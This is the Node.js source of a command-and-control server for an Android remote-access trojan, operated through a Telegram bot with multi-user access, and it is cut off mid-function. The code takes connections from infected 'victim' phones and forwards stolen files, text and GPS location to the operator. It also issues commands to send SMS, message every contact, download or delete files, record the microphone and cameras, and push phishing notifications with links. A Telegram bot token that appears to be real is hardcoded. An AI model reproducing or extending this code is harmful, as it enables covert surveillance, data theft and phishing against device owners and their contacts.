const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const fs = require('fs');  // users.json के लिए

// ==================== CONFIG ====================
const BOT_TOKEN = process.env.BOT_TOKEN || '7894679907:AAGyEcZVhYkyuxnD9Q2ABLfAX_Q-9W1I-Qc';
const ADMIN_ID = process.env.ADMIN_ID || '1453456375';  // Admin ID

// ==================== MULTI-USER SETUP ====================
let authorizedUsers = new Set();
const USERS_FILE = './users.json';

// Load users from file
try {
    const data = fs.readFileSync(USERS_FILE);
    JSON.parse(data).forEach(id => authorizedUsers.add(id.toString()));
} catch (e) {
    // पहली बार में सिर्फ एडमिन को ऐड करो
    authorizedUsers.add(ADMIN_ID);
    saveUsers();
}

function saveUsers() {
    fs.writeFileSync(USERS_FILE, JSON.stringify([...authorizedUsers]));
}

// Data structures: हर यूजर का अलग डेटा
const userDevices = new Map();      // userId -> Map(deviceUuid -> deviceInfo)
const deviceToUser = new Map();      // deviceUuid -> userId
const userCurrentUuid = new Map();   // userId -> currentUuid
const userCurrentNumber = new Map(); // userId -> currentNumber
const userCurrentTitle = new Map();  // userId -> currentTitle

// ==================== EXPRESS SETUP ====================
const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const upload = multer();
app.use(bodyParser.json());

// ==================== TELEGRAM BOT ====================
const appBot = new telegramBot(BOT_TOKEN, { polling: true });

// ==================== HELPERS ====================
function isAuthorized(chatId) {
    return authorizedUsers.has(chatId.toString());
}

function getUserIdByDevice(deviceUuid) {
    return deviceToUser.get(deviceUuid);
}

// ==================== HTTP ENDPOINTS (डिवाइस से डेटा लेना) ====================
app.get('/', (req, res) => {
    res.send('<h1 align="center" style="font-size:18px; color:blue;">❖✙𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮✙❖</h1> <br> <p style="font-size:14px; text-align:center; color:red;">Hacking Community➩ @BLACK_BABA_HACKER </p>');
});

app.post("/uploadFile", upload.single('file'), (req, res) => {
    // यूजर आईडी कैसे लें? हेडर से या क्वेरी से
    const userId = req.headers.userid || req.query.userId;
    if (!userId || !isAuthorized(userId)) {
        return res.status(403).send('Unauthorized');
    }
    
    const name = req.file.originalname;
    appBot.sendDocument(userId, req.file.buffer, {
        caption: `°• 𓅂🪧𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐅𝐫𝐨𝐦 <b>${req.headers.model}</b> 𝐌𝐚𝐜𝐡𝐢𝐧𝐞🦾`,
        parse_mode: "HTML"
    }, {
        filename: name,
        contentType: 'application/txt',
    });
    res.send('');
});

app.post("/uploadText", (req, res) => {
    const userId = req.headers.userid || req.query.userId;
    if (!userId || !isAuthorized(userId)) {
        return res.status(403).send('Unauthorized');
    }
    
    appBot.sendMessage(userId, `°• 𓅂🪧𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐅𝐫𝐨𝐦 <b>${req.headers.model}</b> 𝐌𝐚𝐜𝐡𝐢𝐧𝐞🦾\n\n` + req.body['text'], { parse_mode: "HTML" });
    res.send('');
});

app.post("/uploadLocation", (req, res) => {
    const userId = req.headers.userid || req.query.userId;
    if (!userId || !isAuthorized(userId)) {
        return res.status(403).send('Unauthorized');
    }
    
    appBot.sendLocation(userId, req.body['lat'], req.body['lon']);
    appBot.sendMessage(userId, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, { parse_mode: "HTML" });
    res.send('');
});

// ==================== WEBSOCKET (डिवाइस कनेक्शन) ====================
appSocket.on('connection', (ws, req) => {
    // URL से userId लो (जैसे ws://server.com/?userId=12345)
    const urlParams = new URLSearchParams(req.url.split('?')[1] || '');
    const userId = urlParams.get('userId');
    
    if (!userId || !isAuthorized(userId)) {
        ws.close(1008, 'Unauthorized');
        return;
    }
    
    const uuid = uuid4.v4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'Unknown';
    const version = req.headers.version || 'Unknown';
    const brightness = req.headers.brightness || 'Unknown';
    const provider = req.headers.provider || 'Unknown';

    ws.uuid = uuid;
    ws.userId = userId;  // यूजर आईडी सेव करो

    // डिवाइस को यूजर के अकाउंट में सेव करो
    if (!userDevices.has(userId)) {
        userDevices.set(userId, new Map());
    }
    userDevices.get(userId).set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider,
        ws: ws
    });
    deviceToUser.set(uuid, userId);

    appBot.sendMessage(userId,
        `°• 🤡𝐆𝐎𝐓 𝐀 𝐍𝐄𝐖 𝐏𝐇𝐎𝐍𝐄🤡\n\n` +
        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
        { parse_mode: "HTML" }
    );

    ws.on('close', function () {
        // डिवाइस को यूजर की लिस्ट से हटाओ
        if (userDevices.has(userId)) {
            userDevices.get(userId).delete(uuid);
        }
        deviceToUser.delete(uuid);
        
        appBot.sendMessage(userId,
            `°• 😫𝐏𝐇𝐎𝐍𝐄 𝐒𝐄𝐑𝐕𝐄𝐑 𝐆𝐎𝐍𝐄😖\n\n` +
            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>`,
            { parse_mode: "HTML" }
        );
    });
});

// ==================== ADMIN COMMANDS (यूजर ऐड/रिमूव) ====================
appBot.onText(/\/adduser (\d+)/, (msg, match) => {
    const chatId = msg.chat.id.toString();
    if (chatId !== ADMIN_ID) return;
    
    const newUser = match[1];
    authorizedUsers.add(newUser);
    saveUsers();
    appBot.sendMessage(chatId, `✅ User ${newUser} added.`);
});

appBot.onText(/\/removeuser (\d+)/, (msg, match) => {
    const chatId = msg.chat.id.toString();
    if (chatId !== ADMIN_ID) return;
    
    const user = match[1];
    if (authorizedUsers.has(user)) {
        authorizedUsers.delete(user);
        saveUsers();
        appBot.sendMessage(chatId, `✅ User ${user} removed.`);
    } else {
        appBot.sendMessage(chatId, `❌ User not found.`);
    }
});

appBot.onText(/\/listusers/, (msg) => {
    const chatId = msg.chat.id.toString();
    if (chatId !== ADMIN_ID) return;
    
    const users = [...authorizedUsers].join('\n');
    appBot.sendMessage(chatId, `Authorized users:\n${users}`);
});

// ==================== TELEGRAM BOT MESSAGE HANDLER ====================
appBot.on('message', (message) => {
    const chatId = message.chat.id.toString();
    
    // अगर यूजर अथॉराइज्ड नहीं है तो ignore करो
    if (!isAuthorized(chatId)) {
        return;
    }
    
    // हर यूजर का अपना स्टेट सेट करो (अगर नहीं है तो)
    if (!userCurrentUuid.has(chatId)) userCurrentUuid.set(chatId, '');
    if (!userCurrentNumber.has(chatId)) userCurrentNumber.set(chatId, '');
    if (!userCurrentTitle.has(chatId)) userCurrentTitle.set(chatId, '');
    
    // रिप्लाई हैंडलर
    if (message.reply_to_message) {
        handleReply(chatId, message);
        return;
    }
    
    // मेन बटन हैंडलर
    if (message.text == '/start') {
        appBot.sendMessage(chatId,
            '°•🌹𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝐒𝐄𝐑𝐕𝐄𝐑🌷\n\n' +
            '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
            '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
            '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n' +
            '• 🍀 Developer 👉 @BLACK_BABA_HACKER ⚔️\n\n' +
            '• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        );
    }
    else if (message.text == '📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮') {
        const devices = userDevices.get(chatId);
        if (!devices || devices.size == 0) {
            appBot.sendMessage(chatId,
                '°• 🚏𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞 𝐍𝐨𝐭 𝐅𝐨𝐮𝐧𝐝 ❌\n\n' +
                '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
            );
        } else {
            let text = '°• 🎮𝐋𝐢𝐬𝐭 𝐎𝐟 𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞 🎞️ :\n\n';
            devices.forEach(function (value, key) {
                text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                    `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
                    `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
                    `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
                    `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`;
            });
            appBot.sendMessage(chatId, text, { parse_mode: "HTML" });
        }
    }
    else if (message.text == '📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬') {
        const devices = userDevices.get(chatId);
        if (!devices || devices.size == 0) {
            appBot.sendMessage(chatId,
                '°• 🚏𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞 𝐍𝐨𝐭 𝐅𝐨𝐮𝐧𝐝 ❌\n\n' +
                '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
            );
        } else {
            const deviceListKeyboard = [];
            devices.forEach(function (value, key) {
                deviceListKeyboard.push([{
                    text: value.model,
                    callback_data: 'device:' + key
                }]);
            });
            appBot.sendMessage(chatId, '°• ⚖️𝐒𝐞𝐥𝐞𝐜𝐭 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐅𝐨𝐫 𝐓𝐚𝐫𝐠𝐞𝐭 𝐃𝐞𝐯𝐢𝐜𝐞📱', {
                "reply_markup": {
                    "inline_keyboard": deviceListKeyboard,
                },
            });
        }
    }
});

// ==================== रिप्लाई हैंडलर फंक्शन ====================
function handleReply(chatId, message) {
    const currentUuid = userCurrentUuid.get(chatId) || '';
    const currentNumber = userCurrentNumber.get(chatId) || '';
    const currentTitle = userCurrentTitle.get(chatId) || '';
    
    const replyText = message.reply_to_message.text || '';
    
    // Send SMS फ्लो
    if (replyText.includes('°• 🗯️𝐑𝐞𝐩𝐥𝐲 𝐎𝐟 𝐘𝐨𝐮𝐫 𝐕𝐢𝐜𝐭𝐢𝐦 𝐌𝐞𝐬𝐬𝐚𝐠𝐞🌨️')) {
        userCurrentNumber.set(chatId, message.text);
        appBot.sendMessage(chatId,
            '°• 🏜️𝐆𝐨𝐨𝐝, 𝐍𝐨𝐰 𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐒𝐞𝐧𝐝 𝐓𝐨 𝐓𝐡𝐢𝐬 𝐍𝐮𝐦𝐛𝐞𝐫🌲\n\n' +
            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
            { reply_markup: { force_reply: true } }
        );
    }
    else if (replyText.includes('°• 🏜️𝐆𝐨𝐨𝐝, 𝐍𝐨𝐰 𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐒𝐞𝐧𝐝 𝐓𝐨 𝐓𝐡𝐢𝐬 𝐍𝐮𝐦𝐛𝐞𝐫🌲')) {
        if (currentUuid) {
            sendCommandToDevice(currentUuid, `send_message:${currentNumber}/${message.text}`);
        }
        userCurrentNumber.set(chatId, '');
        userCurrentUuid.set(chatId, '');
        appBot.sendMessage(chatId,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        );
    }
    // Send to all contacts
    else if (replyText.includes('°• 🔄𝐄𝐍𝐓𝐄𝐑 𝐓𝐇𝐄 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐘𝐎𝐔 𝐖𝐀𝐍𝐓 𝐓𝐎 𝐒𝐄𝐍𝐃 𝐓𝐎 𝐀𝐋𝐋 𝐂𝐎𝐍𝐓𝐀𝐂𝐓𝐒👨‍👩‍👧‍👧')) {
        if (currentUuid) {
            sendCommandToDevice(currentUuid, `send_message_to_all:${message.text}`);
        }
        userCurrentUuid.set(chatId, '');
        appBot.sendMessage(chatId,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...',
            {
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        );
    }
    // Download file
    else if (replyText.includes('°• 🍬𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐏𝐚𝐭𝐡 𝐎𝐟 𝐖𝐡𝐚𝐭𝐞𝐯𝐞𝐫 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝📻')) {
        if (currentUuid) {
            sendCommandToDevice(currentUuid, `file:${message.text}`);
        }
        userCurrentUuid.set(chatId, '');
        appBot.sendMessage(chatId,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...',
            {
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        );
    }
    // Delete file
    else if (replyText.includes('°• 🌠𝐆𝐢𝐯𝐞 𝐓𝐡𝐞 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧 𝐎𝐟 𝐖𝐡𝐚𝐭𝐞𝐯𝐞𝐫 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐃𝐞𝐥𝐞𝐭𝐞🗑️')) {
        if (currentUuid) {
            sendCommandToDevice(currentUuid, `delete_file:${message.text}`);
        }
        userCurrentUuid.set(chatId, '');
        appBot.sendMessage(chatId,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...',
            {
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        );
    }
    // Microphone
    else if (replyText.includes('°• 🕍𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐓𝐢𝐦𝐞 𝐨𝐟  𝐘𝐨𝐮  𝐖𝐚𝐧𝐭 𝐑𝐞𝐜𝐨𝐫𝐝 𝐌𝐢𝐜𝐫𝐨𝐩𝐡𝐨𝐧𝐞🦮')) {
        if (currentUuid) {
            sendCommandToDevice(currentUuid, `microphone:${message.text}`);
        }
        userCurrentUuid.set(chatId, '');
        appBot.sendMessage(chatId,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...',
            {
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        );
    }
    // Main camera
    else if (replyText.includes('°• 🎢𝐄𝐧𝐭𝐞𝐫 𝐇𝐨𝐰 𝐋𝐨𝐧𝐠 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐡𝐞 𝐌𝐚𝐢𝐧 𝐂𝐚𝐦𝐞𝐫𝐚 𝐓𝐨 𝐁𝐞 𝐑𝐞𝐜𝐨𝐫𝐝𝐞𝐝🏠')) {
        if (currentUuid) {
            sendCommandToDevice(currentUuid, `rec_camera_main:${message.text}`);
        }
        userCurrentUuid.set(chatId, '');
        appBot.sendMessage(chatId,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...',
            {
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        );
    }
    // Selfie camera
    else if (replyText.includes('°• 🚒𝐄𝐧𝐭𝐞𝐫 𝐇𝐨𝐰 𝐋𝐨𝐧𝐠 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐡𝐞 𝐒𝐞𝐥𝐟𝐞 𝐂𝐚𝐦𝐞𝐫𝐚 𝐓𝐨 𝐁𝐞 𝐑𝐞𝐜𝐨𝐫𝐝𝐞𝐝🚆')) {
        if (currentUuid) {
            sendCommandToDevice(currentUuid, `rec_camera_selfie:${message.text}`);
        }
        userCurrentUuid.set(chatId, '');
        appBot.sendMessage(chatId,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...',
            {
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        );
    }
    // Toast
    else if (replyText.includes('°• 🎒𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐒𝐌𝐒 𝐓𝐡𝐚𝐭 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐒𝐡𝐨𝐰 𝐨𝐧 𝐘𝐨𝐮𝐫 𝐓𝐚𝐫𝐠𝐞𝐭 𝐃𝐞𝐯𝐢𝐜𝐞☂️')) {
        if (currentUuid) {
            sendCommandToDevice(currentUuid, `toast:${message.text}`);
        }
        userCurrentUuid.set(chatId, '');
        appBot.sendMessage(chatId,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...',
            {
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        );
    }
    // Notification - first step
    else if (replyText.includes('°• 🦊𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐀𝐩𝐩𝐞𝐚𝐫 𝐀𝐬 𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧👹')) {
        userCurrentTitle.set(chatId, message.text);
        appBot.sendMessage(chatId,
            '°• 🐼𝐆𝐨𝐨𝐝, 𝐍𝐨𝐰 𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐋𝐢𝐧𝐤 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐁𝐞 𝐎𝐩𝐞𝐧𝐞𝐝 𝐛𝐲 𝐓𝐡𝐞 𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 🎅\n\n' +
            '• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
            { reply_markup: { force_reply: true } }
        );
    }
    // Notification - second step
    else if (replyText.includes('°• 🐼𝐆𝐨𝐨𝐝, 𝐍𝐨𝐰 𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐋𝐢𝐧𝐤 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐁𝐞 𝐎𝐩𝐞𝐧𝐞𝐝 𝐛𝐲 𝐓𝐡𝐞 𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 🎅')) {
        if (currentUuid) {
            sendCommandToDevice(currentUuid, `show_notification:${userCurrentTitle.get(chatId)}/${message.text}`);
        }
        userCurrentUuid.set(chatId, '');
        userCurrentTitle.set(chatId, '');
        appBot.sendMessage(chatId,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...',
            {
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        );
    }
    // Play audio
    else if (replyText.includes('°• 📞𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐀𝐮𝐝𝐢𝐨 𝐋𝐢𝐧𝐤 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐏𝐥𝐚𝐲♑')) {
        if (currentUuid) {
            sendCommandToDevice(currentUuid, `play_audio:${message.text}`);
        }
        userCurrentUuid.set(chatId, '');
        appBot.sendMessage(chatId,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...',
            {
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        );
    }
}

// ==================== कमांड भेजने का हेल्पर फंक्शन ====================
function sendCommandToDevice(deviceUuid, command) {
    let sent = false;
    appSocket.clients.forEach(ws => {
        if (ws.uuid == deviceUuid && ws.readyState === webSocket.OPEN) {
